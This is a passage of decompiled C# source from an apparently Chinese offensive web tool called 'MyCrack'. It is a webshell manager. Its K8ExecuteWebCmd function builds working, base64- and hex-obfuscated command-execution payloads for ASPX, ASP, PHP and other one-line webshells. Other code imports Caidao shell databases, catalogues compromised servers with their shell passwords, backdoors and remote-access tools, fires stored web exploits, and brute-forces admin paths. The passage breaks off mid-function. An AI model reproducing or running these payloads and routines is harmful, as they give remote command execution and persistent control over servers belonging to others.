            builder.Append(num3.ToString() + " 分钟 == ");
            builder.Append(num4.ToString() + " 小时 ");
            int num5 = (int) (((double) k8count) / num3);
            this.lbl_resultDataOut.Text = string.Concat(new object[] { this.lbl_resultDataOut.Text, " 结束: ", now.ToString(), builder, num5.ToString(), " 条/分钟" });
            GC.Collect();
        }

        private void K8endTimeScanAdmin(int k8count, DateTime K8StartTime)
        {
            this.AllowScanAdminControl();
            this.txt_ScanAdminResult.AppendText("扫描结束!");
            DateTime now = DateTime.Now;
            TimeSpan span = new TimeSpan(0, 0, 0);
            span = (TimeSpan) (now - K8StartTime);
            double num2 = Convert.ToDouble(string.Format("{0:0.0}", Convert.ToDouble(span.TotalSeconds.ToString())));
            double num3 = Convert.ToDouble(string.Format("{0:0.0}", Convert.ToDouble(span.TotalMinutes)));
            double num4 = Convert.ToDouble(string.Format("{0:0.0}", Convert.ToDouble(span.TotalHours)));
            StringBuilder builder = new StringBuilder();
            builder.Append(" 用时: " + num2.ToString() + " 秒 == ");
            builder.Append(num3.ToString() + " 分钟 == ");
            builder.Append(num4.ToString() + " 小时 ");
            int num5 = (int) (((double) k8count) / num3);
            this.lbl_ScanAdminResult.Text = string.Concat(new object[] { this.lbl_ScanAdminResult.Text, " 结束: ", now.ToString(), builder, num5.ToString(), " 条/分钟" });
        }

        private string K8ExecuteCmdCoding()
        {
            switch (this.cbb_utf8Gb3212CMD.Text.Trim().ToUpper())
            {
                case "UTF-8":
                    return "65001";

                case "GB2312":
                    return "936";
            }
            return "65001";
        }

        private void K8ExecuteWebCmd(string K8Commond, int k8type)
        {
            if (k8type == 1)
            {
                this.txt_WebCmdResult.AppendText(K8Commond);
            }
            string onePostData = "";
            if (this.rb_aspxCmd.Checked)
            {
                onePostData = this.txt_OneShellPwd.Text.Trim() + "=Response.Write%28%22-%3E|%22%29;var%20err:Exception;try{eval%28System.Text.Encoding.GetEncoding%28" + this.K8ExecuteCmdCoding() + "%29.GetString%28System.Convert.FromBase64String%28%22dmFyIGM9bmV3IFN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzU3RhcnRJbmZvKFN5c3RlbS5UZXh0LkVuY29kaW5nLkdldEVuY29kaW5nKDY1MDAxKS5HZXRTdHJpbmcoU3lzdGVtLkNvbnZlcnQuRnJvbUJhc2U2NFN0cmluZyhSZXF1ZXN0Lkl0ZW1bInoxIl0pKSk7dmFyIGU9bmV3IFN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzKCk7dmFyIG91dDpTeXN0ZW0uSU8uU3RyZWFtUmVhZGVyLEVJOlN5c3RlbS5JTy5TdHJlYW1SZWFkZXI7Yy5Vc2VTaGVsbEV4ZWN1dGU9ZmFsc2U7Yy5SZWRpcmVjdFN0YW5kYXJkT3V0cHV0PXRydWU7Yy5SZWRpcmVjdFN0YW5kYXJkRXJyb3I9dHJ1ZTtlLlN0YXJ0SW5mbz1jO2MuQXJndW1lbnRzPSIvYyAiK1N5c3RlbS5UZXh0LkVuY29kaW5nLkdldEVuY29kaW5nKDY1MDAxKS5HZXRTdHJpbmcoU3lzdGVtLkNvbnZlcnQuRnJvbUJhc2U2NFN0cmluZyhSZXF1ZXN0Lkl0ZW1bInoyIl0pKTtlLlN0YXJ0KCk7b3V0PWUuU3RhbmRhcmRPdXRwdXQ7RUk9ZS5TdGFuZGFyZEVycm9yO2UuQ2xvc2UoKTtSZXNwb25zZS5Xcml0ZShvdXQuUmVhZFRvRW5kKCkrRUkuUmVhZFRvRW5kKCkpOw%3D%3D%22%29%29,%22unsafe%22%29;}catch%28err%29{Response.Write%28%22ERROR://%20%22%2Berr.message%29;}Response.Write%28%22|%3C-%22%29;Response.End%28%29;&z1=Y21k&z2=";
                K8Commond = "cd /d \"" + this.WebCurPath + "\"&" + K8Commond + "&echo [S]&cd&echo [E]";
                onePostData = onePostData + K8crack.K8Base64(K8Commond, 1);
            }
            else if (this.rb_aspCmd.Checked)
            {
                onePostData = this.txt_OneShellPwd.Text.Trim() + "=Execute(\"Execute(\"\"On+Error+Resume+Next:Function+bd%28byVal+s%29%3AFor+i%3D1+To+Len%28s%29+Step+2%3Ac%3DMid%28s%2Ci%2C2%29%3AIf+IsNumeric%28Mid%28s%2Ci%2C1%29%29+Then%3AExecute%28%22%22%22%22bd%3Dbd%26chr%28%26H%22%22%22%22%26c%26%22%22%22%22%29%22%22%22%22%29%3AElse%3AExecute%28%22%22%22%22bd%3Dbd%26chr%28%26H%22%22%22%22%26c%26Mid%28s%2Ci%2B2%2C2%29%26%22%22%22%22%29%22%22%22%22%29%3Ai%3Di%2B2%3AEnd+If%22%22%26chr%2810%29%26%22%22Next%3AEnd+Function:Response.Write(\"\"\"\"->|\"\"\"\"):Execute(\"\"\"\"On+Error+Resume+Next:\"\"\"\"%26bd(\"\"\"\"53657420583D4372656174654F626A6563742822777363726970742E7368656C6C22292E657865632822222222266264285265717565737428227A3122292926222222202F6320222222266264285265717565737428227A322229292622222222293A496620457272205468656E3A533D225B4572725D2022264572722E4465736372697074696F6E3A4572722E436C6561723A456C73653A4F3D582E5374644F75742E52656164416C6C28293A453D582E5374644572722E52656164416C6C28293A533D4F26453A456E642049663A526573706F6E73652E7772697465285329\"\"\"\")):Response.Write(\"\"\"\"|<-\"\"\"\"):Response.End\"\")\")&z1=636D64&z2=";
                K8Commond = "cd /d \"" + this.WebCurPath + "\"&" + K8Commond + "&echo [S]&cd&echo [E]";
                onePostData = onePostData + K8crack.StrToHex(K8Commond);
            }
            else if (this.rb_phpCmd.Checked)
            {
                if (this.WebCurPath.Substring(0, 1) == "/")
                {
                    onePostData = this.txt_OneShellPwd.Text.Trim() + "=%40eval%01%28base64_decode%28%24_POST%5Bz0%5D%29%29%3B&z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskcD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JHM9YmFzZTY0X2RlY29kZSgkX1BPU1RbInoyIl0pOyRkPWRpcm5hbWUoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTskYz1zdWJzdHIoJGQsMCwxKT09Ii8iPyItYyBcInskc31cIiI6Ii9jIFwieyRzfVwiIjskcj0ieyRwfSB7JGN9IjtAc3lzdGVtKCRyLiIgMj4mMSIsJHJldCk7cHJpbnQgKCRyZXQhPTApPyIKcmV0PXskcmV0fQoiOiIiOztlY2hvKCJ8PC0iKTtkaWUoKTs%3D&z1=L2Jpbi9zaA%3D%3D&z2=";
                    K8Commond = "cd \"" + this.WebCurPath + "\";" + K8Commond + ";echo [S];pwd;echo [E]";
                }
                else
                {
                    onePostData = this.txt_OneShellPwd.Text.Trim() + "=%40eval%01%28base64_decode%28%24_POST%5Bz0%5D%29%29%3B&z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskcD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JHM9YmFzZTY0X2RlY29kZSgkX1BPU1RbInoyIl0pOyRkPWRpcm5hbWUoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTskYz1zdWJzdHIoJGQsMCwxKT09Ii8iPyItYyBcInskc31cIiI6Ii9jIFwieyRzfVwiIjskcj0ieyRwfSB7JGN9IjtAc3lzdGVtKCRyLiIgMj4mMSIsJHJldCk7cHJpbnQgKCRyZXQhPTApPyIKcmV0PXskcmV0fQoiOiIiOztlY2hvKCJ8PC0iKTtkaWUoKTs%3D&z1=Y21k&z2=";
                    K8Commond = "cd /d \"" + this.WebCurPath + "\"&" + K8Commond + "&echo [S]&cd&echo [E]";
                }
                onePostData = onePostData + K8crack.K8Base64(K8Commond, 1);
            }
            else if (this.rb_jspCmd.Checked)
            {
                onePostData = this.txt_OneShellPwd.Text.Trim() + "=" + K8crack.K8Base64(K8Commond, 1);
            }
            else if (this.rb_cfmCmd.Checked)
            {
                onePostData = this.txt_OneShellPwd.Text.Trim() + "=M&z0=" + this.K8ExecuteCmdCoding() + "&z1=/ccmd&z2=";
                K8Commond = "cd+%2Fd+%22" + this.WebCurPath + "%22%26" + K8Commond + "%26echo+%5BS%5D%26cd%26echo+%5BE%5D";
                onePostData = onePostData + K8Commond;
            }
            else if (this.rb_pythonCmd.Checked)
            {
                onePostData = this.txt_OneShellPwd.Text.Trim() + "=" + K8crack.K8Base64(K8Commond, 1);
            }
            else if (this.rb_perlCmd.Checked)
            {
                onePostData = "&" + this.txt_OneShellPwd.Text.Trim() + "=" + K8crack.K8Base64(K8Commond, 1);
            }
            this.K8_PostExecuteCMD(onePostData, 1);
        }
        //zzw.20170328 click exp button 
        private void K8EXP_click(object sender, EventArgs e)
        {
            this.btnEXPclick = (Button) sender;
            this.btnEXPclick.Enabled = false;
            string id = this.btnEXPclick.Name.Split(new char[] { '_' })[1];
            string str2 = "";
            string str = "";
            string str4 = "";
            string str5 = "";
            string str6 = "";
            string str7 = "";
            string str8 = "";
            string str9 = "";
            string str10 = "";
            string str11 = "";
            string str12 = "";
            DataSet idDataSet = BLLk8EXP.GetIdDataSet(id);
            foreach (DataRow row in idDataSet.Tables[0].Rows)
            {
                str2 = row["appName"].ToString();
                str = row["btnName"].ToString();
                str4 = row["btnTip"].ToString();
                str5 = row["method"].ToString();
                str6 = row["cookie"].ToString();
                str7 = row["sumbitData"].ToString();
                str8 = row["referer"].ToString();
                str9 = row["userAgent"].ToString();
                str10 = row["encode"].ToString();
                str11 = row["allowRedirect"].ToString();
                str12 = row["addURL"].ToString();
                str = K8crack.K8expBase64(str, 0);
                str4 = K8crack.K8expBase64(str4, 0);
                str6 = K8crack.K8expBase64(str6, 0);
                str7 = K8crack.K8expBase64(str7, 0);
                str8 = K8crack.K8expBase64(str8, 0);
                str9 = K8crack.K8expBase64(str9, 0);
                str12 = K8crack.K8expBase64(str12, 0);
            }
            switch (str5)
            {
                case "GET":
                    this.WebExploitGet(str12, str6, str7, str8, str9, str10, str11);
                    break;

                case "POST":
                    this.WebExploitPost(str12, str6, str7, str8, str9, str10, str11);
                    break;
            }
        }

        public void K8GetAdmin(object li)
        {
            string str = this.k8urlScanAdmin;
            string str2 = this.k8adminDir;
            string text = "第" + this.k8ScanAdminNum.ToString() + "条 " + str + str2 + "\r\n\r\n";
            if (K8scanAdmin(str, str2, 0xbb8))
            {
                int count = this.LV_ScanAdmin.Items.Count;
                if ((count % 6) == 0)
                {
                    this.LV_ScanAdmin.Items.Add(new ListViewItem(new string[] { "", "" }));
                    this.LV_ScanAdmin.Items[count].SubItems[0].BackColor = Color.Red;
                }
                this.LV_ScanAdmin.Items.Add(new ListViewItem(new string[] { count.ToString(), str + str2 }));
            }
            this.txt_ScanAdminResult.AppendText(text);
        }

        public void K8GetAdmin(string k8url, string k8admin, int k8num)
        {
            string text = "第" + k8num.ToString() + "条 " + k8url + k8admin + "\r\n\r\n";
            if (K8scanAdmin(k8url, k8admin, 0xbb8))
            {
                int count = this.LV_ScanAdmin.Items.Count;
                if ((count % 6) == 0)
                {
                    this.LV_ScanAdmin.Items.Add(new ListViewItem(new string[] { "", "" }));
                }
                this.LV_ScanAdmin.Items.Add(new ListViewItem(new string[] { count.ToString(), k8url + k8admin }));
            }
            this.txt_ScanAdminResult.AppendText(text);
        }

        private string K8getXssDBcount(string DBPath, string SqlStr)
        {
            return BllGetDataSetXSS(DBPath, SqlStr).Tables[0].Rows[0][0].ToString();
        }

        private void K8holidays()
        {
            this.holidays[1, 1] = "元旦";
            this.holidays[2, 14] = "情人节";
            this.holidays[3, 8] = "妇女节";
            this.holidays[3, 15] = "消费者权益日";
            this.holidays[4, 1] = "愚人节";
            this.holidays[5, 1] = "劳动节";
            this.holidays[5, 4] = "青年节";
            this.holidays[5, 20] = "网络520";
            this.holidays[6, 1] = "儿童节";
            this.holidays[7, 1] = "党的生日";
            this.holidays[8, 1] = "建军节";
            this.holidays[9, 10] = "教师节";
            this.holidays[10, 1] = "国庆节";
            this.holidays[11, 1] = "小光棍节";
            this.holidays[11, 11] = "光棍节";
            this.holidays[12, 12] = "双十二";
            this.holidays[12, 0x18] = "平安夜";
            this.holidays[12, 0x19] = "圣诞节";
            this.Chinaholidays[1, 1] = "春节";
            this.Chinaholidays[1, 15] = "元宵节";
            this.Chinaholidays[3, 3] = "三月三(广西法定假日)";
            this.Chinaholidays[5, 5] = "端午节";
            this.Chinaholidays[7, 7] = "七夕";
            this.Chinaholidays[7, 14] = "鬼节";
            this.Chinaholidays[7, 15] = "鬼节";
            this.Chinaholidays[8, 15] = "中秋节";
            this.Chinaholidays[9, 9] = "重阳";
            this.Chinaholidays[12, 8] = "腊八节";
            this.Chinaholidays[12, 0x17] = "小年";
        }

        private void K8inputCaidaoDB()
        {
            OpenFileDialog dialog = new OpenFileDialog {
                Filter = "mdb file|*.mdb"
            };
            if (dialog.ShowDialog() == DialogResult.OK)
            {
                string fileName = dialog.FileName;
                DataSet set = BllGetDataSet(fileName);
                foreach (DataRow row in set.Tables[0].Rows)
                {
                    string str2 = "";
                    string str3 = "";
                    string str4 = "";
                    string str5 = "";
                    string str6 = "";
                    string str7 = row["SiteUrl"].ToString();
                    string str8 = row["SitePass"].ToString();
                    string str9 = row["nCodePage"].ToString();
                    string str10 = "";
                    string str11 = row["IP"].ToString();
                    string str12 = "";
                    string str13 = "";
                    string str14 = row["nScript"].ToString();
                    switch (str14)
                    {
                        case "0":
                            str14 = "PHP";
                            break;

                        case "1":
                            str14 = "NET";
                            break;

                        case "2":
                            str14 = "ASP";
                            break;
                    }
                    string str15 = "";
                    string str16 = "";
                    string str17 = "";
                    string str18 = DateTime.Now.Date.ToShortDateString();
                    if (str18.Contains("/"))
                    {
                        str18 = str18.Replace("/", "-");
                    }
                    string[] modelArray = new string[] { 
                        str2, str3, str4, str5, str6, str7, str8, str9, str10, str11, str12, str13, str14, str15, str16, str17, 
                        str18
                     };
                    if (!BLLk8shell.ExistsRecord(new string[] { str7 }) && BLLk8shell.InsertRecord(modelArray))
                    {
                    }
                }
                this.K8loadWebShellData();
                this.K8msgbox("WebShell导入完成!");
            }
        }

        private static string K8IP2Area(string ip)
        {
            K8IPselect pselect = new K8IPselect();
            string str = Directory.GetCurrentDirectory().ToString();
            pselect.DataPath = str + @"\K8_qqwry.DAT";
            pselect.IP = ip;
            string str2 = pselect.IPLocation();
            string errMsg = pselect.ErrMsg;
            if (str2 != "")
            {
                return str2.Replace("CZ88.NET", "");
            }
            return errMsg;
        }

        private void K8loadDataDB()
        {
            if (!System.IO.File.Exists("K8data.mdb"))
            {
                this.K8msgbox("K8data.mdb Not Found!");
            }
            else
            {
                this.lv_webShell.Columns.Add("SqlID", 0);
                this.lv_webShell.Columns.Add("ID", 30, HorizontalAlignment.Left);
                this.lv_webShell.Columns[1].TextAlign = HorizontalAlignment.Left;
                this.lv_webShell.Columns.Add("项目编号", 80);
                this.lv_webShell.Columns[2].TextAlign = HorizontalAlignment.Left;
                this.lv_webShell.Columns.Add("级别", 40);
                this.lv_webShell.Columns[3].TextAlign = HorizontalAlignment.Center;
                this.lv_webShell.Columns.Add("状态", 40);
                this.lv_webShell.Columns[4].TextAlign = HorizontalAlignment.Center;
                this.lv_webShell.Columns.Add("权限", 50);
                this.lv_webShell.Columns[5].TextAlign = HorizontalAlignment.Center;
                this.lv_webShell.Columns.Add("PR", 30);
                this.lv_webShell.Columns[6].TextAlign = HorizontalAlignment.Center;
                this.lv_webShell.Columns.Add("Shell地址", 180);
                this.lv_webShell.Columns[7].TextAlign = HorizontalAlignment.Left;
                this.lv_webShell.Columns.Add("Shell密码", 0);
                this.lv_webShell.Columns[8].TextAlign = HorizontalAlignment.Left;
                this.lv_webShell.Columns.Add("Shell编码", 0);
                this.lv_webShell.Columns[9].TextAlign = HorizontalAlignment.Left;
                this.lv_webShell.Columns.Add("XssCookie", 0);
                this.lv_webShell.Columns[10].TextAlign = HorizontalAlignment.Center;
                this.lv_webShell.Columns.Add("服务器IP", 120);
                this.lv_webShell.Columns[11].TextAlign = HorizontalAlignment.Left;
                this.lv_webShell.Columns.Add("地区", 40);
                this.lv_webShell.Columns[12].TextAlign = HorizontalAlignment.Center;
                this.lv_webShell.Columns.Add("系统", 60);
                this.lv_webShell.Columns[13].TextAlign = HorizontalAlignment.Center;
                this.lv_webShell.Columns.Add("脚本", 50);
                this.lv_webShell.Columns[14].TextAlign = HorizontalAlignment.Center;
                this.lv_webShell.Columns.Add("数据库", 60);
                this.lv_webShell.Columns[15].TextAlign = HorizontalAlignment.Center;
                this.lv_webShell.Columns.Add("远控", 60);
                this.lv_webShell.Columns[0x10].TextAlign = HorizontalAlignment.Center;
                this.lv_webShell.Columns.Add("后门", 60);
                this.lv_webShell.Columns[0x11].TextAlign = HorizontalAlignment.Center;
                this.lv_webShell.Columns.Add("添加时间", 140);
                this.lv_webShell.Columns[0x12].TextAlign = HorizontalAlignment.Left;
                this.K8loadWebShellData();
                this.K8createTabExpBtn();
            }
        }

        public void K8loadWebShellData()
        {
            int num = 1;
            this.lv_webShell.Items.Clear();
            DataSet dataSet = BLLk8shell.GetDataSet();
            foreach (DataRow row in dataSet.Tables[0].Rows)
            {
                string str = row["ID"].ToString();
                string str2 = row["TargetID"].ToString();
                string str3 = row["TargetLevel"].ToString();
                string str4 = row["IsOnline"].ToString();
                string str5 = row["Permission"].ToString();
                string str6 = row["PR"].ToString();
                string str7 = row["ShellPath"].ToString();
                string str8 = row["ShellPass"].ToString();
                string str9 = row["ShellCoding"].ToString();
                string str10 = row["XssCookie"].ToString();
                string str11 = row["IP"].ToString();
                string str12 = row["Area"].ToString();
                string str13 = row["OS"].ToString();
                string str14 = row["ScritpType"].ToString();
                string str15 = row["SQLType"].ToString();
                string str16 = row["RemoteRat"].ToString();
                string str17 = row["BackDoor"].ToString();
                string str18 = row["AddTime"].ToString();
                string[] items = new string[] { 
                    str, num++.ToString(), str2, str3, str4, str5, str6, str7, str8, str9, str10, str11, str12, str13, str14, str15, 
                    str16, str17, str18
                 };
                this.lv_webShell.Items.Add(new ListViewItem(items));
            }
        }

        private void k8Md5CodeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Copy();
                string s = Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text));
                s = "\r\n\r\nif (K8md5Hash == \"" + K8crack.K8MD5(s, 0x10) + "\" || K8md5Hash == \"" + K8crack.K8MD5(s, 0x20) + "\")\r\n\treturn \"" + s + "\";\r\n";
                Clipboard.SetDataObject(s);
                this.txt_EncodeDecodeText.AppendText(s);
            }
        }

        private void K8MoreThreadDataOutput()
        {
            int K8ThreadNum = int.Parse(this.txt_ThreadsOutData.Text.Trim());
            if (K8ThreadNum == 0)
            {
                MessageBox.Show("最小线程数为1,请重新输入");
                this.txt_ThreadsOutData.Text = "1";
            }
            else
            {
                this.txt_ThreadsOutData.Text = this.txt_ThreadsOutData.Text.TrimStart(new char[] { '0' });
                this.txt_resultDataOut.Text = "";
                this.K8AbortScan = false;
                this.k8foundmul = 0;
                this.btn_dataOutputMul.Enabled = false;
                this.btn_OutDataStop.Enabled = true;
                this.K8saveOutDataIni();
                new Thread(() => this.K8threadPoolDataOutput(K8ThreadNum)) { IsBackground = true }.Start();
            }
        }

        private void K8MoreThreadScanAdmin()
        {
            int K8ThreadNum = int.Parse(this.txt_ThreadsScanAdmin.Text.Trim());
            if (K8ThreadNum == 0)
            {
                MessageBox.Show("最小线程数为1,请重新输入");
                this.txt_ThreadsScanAdmin.Text = "1";
            }
            else
            {
                this.txt_ThreadsScanAdmin.Text = this.txt_ThreadsScanAdmin.Text.TrimStart(new char[] { '0' });
                this.DisAllowScanAdminControl();
                new Thread(() => this.K8threadPoolScanAdmin(K8ThreadNum)) { IsBackground = true }.Start();
                this.K8isAbortScanAdmin = false;
            }
        }

        public void K8msgbox(string k8msg)
        {
            MessageBox.Show(this, k8msg, this.Text, MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
        }

        public void K8msgbox(string TipTitle, string k8msg)
        {
            MessageBox.Show(this, k8msg, TipTitle, MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
        }

        private static void K8OpenURL(string K8URL)
        {
            if (System.IO.File.Exists(@"C:\Program Files\Mozilla Firefox\firefox.exe"))
            {
                Process.Start("Firefox.EXE", K8URL);
            }
            else
            {
                Process.Start("iexplore.EXE", K8URL);
            }
        }

        private void K8readFile2chr(string k8filter, string k8startStr, string K8endStr)
        {
            OpenFileDialog dialog = new OpenFileDialog {
                Filter = k8filter
            };
            if (dialog.ShowDialog() == DialogResult.OK)
            {
                this.txt_EncodeDecodeText.Text = "正在读取文件,请稍等...";
                FileStream input = new FileStream(dialog.FileName, FileMode.Open, FileAccess.Read);
                byte[] bytes = new byte[input.Length];
                BinaryReader reader = new BinaryReader(input);
                bytes = reader.ReadBytes((int) input.Length);
                string str2 = Encoding.Default.GetString(bytes);
                string str3 = "";
                foreach (char ch in str2)
                {
                    str3 = str3 + Convert.ToString((int) ch) + ",";
                }
                this.txt_EncodeDecodeText.Text = k8startStr + str3.Trim(new char[] { ',' }) + K8endStr;
                reader.Close();
                reader = null;
                input.Close();
            }
        }

        private void K8readFile2Hex(string k8filter, string k8startStr, string K8endStr)
        {
            OpenFileDialog dialog = new OpenFileDialog {
                Filter = k8filter
            };
            if (dialog.ShowDialog() == DialogResult.OK)
            {
                this.txt_EncodeDecodeText.Text = "正在读取文件,请稍等...";
                FileStream input = new FileStream(dialog.FileName, FileMode.Open, FileAccess.Read);
                byte[] bytes = new byte[input.Length];
                BinaryReader reader = new BinaryReader(input);
                bytes = reader.ReadBytes((int) input.Length);
                this.txt_EncodeDecodeText.Text = k8startStr + ToHexString(bytes) + K8endStr;
                reader.Close();
                reader = null;
                input.Close();
            }
        }

        private void K8saveOutDataIni()
        {
            this.IniWriteValue("K8dataOutput", "url", this.txt_urlDataOutput.Text, k8flyConfig);
            this.IniWriteValue("K8dataOutput", "exp", this.txt_sqlDataOutput.Text, k8flyConfig);
            if (this.rb_GetDataOut.Checked)
            {
                this.IniWriteValue("K8dataOutput", "Method", "GET", k8flyConfig);
            }
            else if (this.rb_PostDataOut.Checked)
            {
                this.IniWriteValue("K8dataOutput", "Method", "POST", k8flyConfig);
            }
            this.IniWriteValue("K8dataOutput", "Coding", this.cbb_DataOutEncoding.Text, k8flyConfig);
            this.IniWriteValue("K8dataOutput", "Min", this.txt_minnum.Text, k8flyConfig);
            this.IniWriteValue("K8dataOutput", "Max", this.txt_maxnum.Text, k8flyConfig);
            this.IniWriteValue("K8dataOutput", "Threads", this.txt_ThreadsOutData.Text, k8flyConfig);
            this.IniWriteValue("K8dataOutput", "CutStrS", this.txt_dataOutstartStr.Text, k8flyConfig);
            this.IniWriteValue("K8dataOutput", "CutStrE", this.txt_dataOutEndStr.Text, k8flyConfig);
            if (this.chk_DataOutRegex.Checked)
            {
                this.IniWriteValue("K8dataOutput", "RegStr", this.txt_dataOutRegex.Text, k8flyConfig);
            }
        }

        public static bool K8scanAdmin(string k8url, string k8admin, int timeout)
        {
            return K8WebOperation.IsExistURLfile(k8url + k8admin, timeout);
        }

        public void K8scanAdminMul(object li)
        {
            if (!this.K8isAbortScanAdmin)
            {
                List<string> list = li as List<string>;
                string str = list[0];
                string str2 = list[1];
                string str3 = list[2];
                if (K8WebOperation.IsExistURLfile(str + str2, 0xbb8))
                {
                    int num = this.LV_ScanAdmin.Items.Count - this.intScanAdminSpace;
                    if (num == 0)
                    {
                        num = 0;
                    }
                    else if ((num % 5) == 0)
                    {
                        this.intScanAdminSpace++;
                        this.LV_ScanAdmin.Items.Add(new ListViewItem(new string[] { "", "" }));
                    }
                    this.LV_ScanAdmin.Items.Add(new ListViewItem(new string[] { num.ToString(), str + str2 }));
                }
                this.txt_ScanAdminResult.AppendText("第" + str3.ToString() + "条 " + str + str2 + "\r\n\r\n");
            }
        }

        public static bool K8scanAdminOne(object li)
        {
            List<string> list = li as List<string>;
            string str = list[0];
            string str2 = list[1];
            return K8WebOperation.IsExistURLfile(str + str2, 0xbb8);
        }

        public void K8scanAdminSin(object li)
        {
            ArrayList list = new ArrayList();
            List<string> list2 = li as List<string>;
            string str = list2[0];
            this.K8scanRobotstxt(str);
            string txtPath = null;
            int num = 0;
            txtPath = this.SelectAdminDic(txtPath);
            DateTime time = this.K8startTimeScanAdmin();
            StreamReader reader = null;
            FileStream stream = null;
            StringBuilder builder = null;
            try
            {
                stream = new FileStream(txtPath, FileMode.Open, FileAccess.Read);
                reader = new StreamReader(stream, Encoding.Default);
                builder = new StringBuilder();
                while (!this.K8isAbortScanAdmin)
                {
                    string str3 = reader.ReadLine();
                    if (str3 == null)
                    {
                        break;
                    }
                    string str4 = str3;
                    if (str4.Length != 0)
                    {
                        if (K8scanAdmin(str, str4, 0xbb8))
                        {
                            int num2 = this.LV_ScanAdmin.Items.Count - this.intScanAdminSpace;
                            if (num2 == 0)
                            {
                                num2 = 0;
                            }
                            else if ((num2 % 5) == 0)
                            {
                                this.intScanAdminSpace++;
                                this.LV_ScanAdmin.Items.Add(new ListViewItem(new string[] { "", "" }));
                            }
                            this.LV_ScanAdmin.Items.Add(new ListViewItem(new string[] { num2.ToString(), str + str4 }));
                        }
                        this.txt_ScanAdminResult.AppendText("第" + num.ToString() + "条 " + str + str4 + "\r\n\r\n");
                    }
                    num++;
                }
                reader.Close();
                stream.Close();
            }
            catch (Exception)
            {
            }
            this.K8endTimeScanAdmin(num, time);
        }

        private void K8scanRobotstxt(string k8url)
        {
            this.LV_ScanAdmin.Items.Add(new ListViewItem(new string[] { "", "" }));
            string[] strArray2 = ScanRobots(k8url);
            this.txt_ScanAdminResult.AppendText("Target: " + k8url + "\r\n\r\n〓Scan robots.txt〓\r\n\r\n");
            if (strArray2.Length <= 0)
            {
                this.txt_ScanAdminResult.AppendText("◎Not Found information\r\n\r\n");
            }
            else
            {
                this.txt_ScanAdminResult.AppendText("◎Found the following information\r\n\r\n");
                string[] strArray3 = new string[strArray2.Length];
                string str = k8url.TrimEnd(new char[] { '/' });
                foreach (string str2 in strArray2)
                {
                    if (str2.Contains("Disallow:"))
                    {
                        string str3 = str + str2.Replace("Disallow:", "").Trim();
                        this.txt_ScanAdminResult.AppendText(str3 + "\r\n\r\n");
                    }
                    else if (str2.Contains("Allow:"))
                    {
                        this.txt_ScanAdminResult.AppendText((str + str2.Replace("Allow:", "").Trim()) + "\r\n\r\n");
                    }
                    if (K8scanAdmin(k8url, str2, 0xbb8))
                    {
                        int num2 = this.LV_ScanAdmin.Items.Count - this.intScanAdminSpace;
                        if (num2 == 0)
                        {
                            num2 = 0;
                        }
                        else if ((num2 % 5) == 0)
                        {
                            this.intScanAdminSpace++;
                            this.LV_ScanAdmin.Items.Add(new ListViewItem(new string[] { "", "" }));
                        }
                        this.LV_ScanAdmin.Items.Add(new ListViewItem(new string[] { num2.ToString(), k8url + str2 }));
                    }
                }
                this.txt_ScanAdminResult.AppendText("■Scan robots.txt finished!■\r\n\r\n");
            }
        }

        private void K8SetBtnStyle(Button btn)
        {
            btn.FlatStyle = FlatStyle.Flat;
            btn.ForeColor = Color.Transparent;
            btn.BackColor = Color.Transparent;
            btn.FlatAppearance.BorderSize = 0;
            btn.FlatAppearance.MouseOverBackColor = Color.Transparent;
            btn.FlatAppearance.MouseDownBackColor = Color.Transparent;
        }

        private void K8SetIcoBtnStyle(Button icoBtn)
        {
            icoBtn.FlatStyle = FlatStyle.Flat;
            icoBtn.FlatAppearance.BorderSize = 0;
            Image image = new Bitmap(@"K8skin\btn_Normal.png");
            icoBtn.BackgroundImage = image;
            icoBtn.Cursor = Cursors.Hand;
            icoBtn.MouseDown += new MouseEventHandler(this.icoBtn_MouseDown);
            icoBtn.MouseMove += new MouseEventHandler(this.icoBtn_MouseMove);
            icoBtn.MouseUp += new MouseEventHandler(this.icoBtn_MouseUp);
            icoBtn.MouseLeave += new EventHandler(this.icoBtn_MouseLeave);
        }

        private void K8setLanguage()
        {
            string str = EnvironmentLang.SystemDefaultLangID.ToString();
            string str2 = Thread.CurrentThread.CurrentCulture.ThreeLetterWindowsLanguageName.ToUpper();
            this.lbl_K8Holiday.Text = this.K8calcHoliday();
            if (((((((str2 == "CHS") | (str2 == "CHT")) | (str == "2052")) | (str == "4100")) | (str == "1028")) | (str == "3076")) | (str == "5124"))
            {
                this.Text = "MyCrack" + this.K8buildDate;
                this.lbl_appTitle.Text = "MyCrack";
                if (Environment.OSVersion.Version < new Version(6, 1))
                {
                    if (IsWindowsXP | IsWindows2003)
                    {
                        this.icoBtn_WebShell.Top = this.icoBtn_WebShell.Top;
                    }
                    else
                    {
                        this.icoBtn_WebShell.Top = this.icoBtn_WebShell.Top;
                    }
                    this.icoBtn_ExpDebug.Top = this.icoBtn_WebShell.Top;
                    this.icoBtn_encodeDecode.Top = this.icoBtn_WebShell.Top;
                    this.icoBtn_CookieBrowser.Top = this.icoBtn_WebShell.Top;
                    this.icoBtn_CmdShell.Top = this.icoBtn_WebShell.Top;
                    this.icoBtn_EXploitDB.Top = this.icoBtn_WebShell.Top;
                    this.icoBtn_dataOutput.Top = this.icoBtn_WebShell.Top;
                    this.icoBtn_about.Top = this.icoBtn_WebShell.Top;
                }
            }
            else
            {
                this.Text = "MyCrack";
                this.lbl_appTitle.Text = "MyCrack";
                if (Environment.OSVersion.Version <= new Version(6, 1))
                {
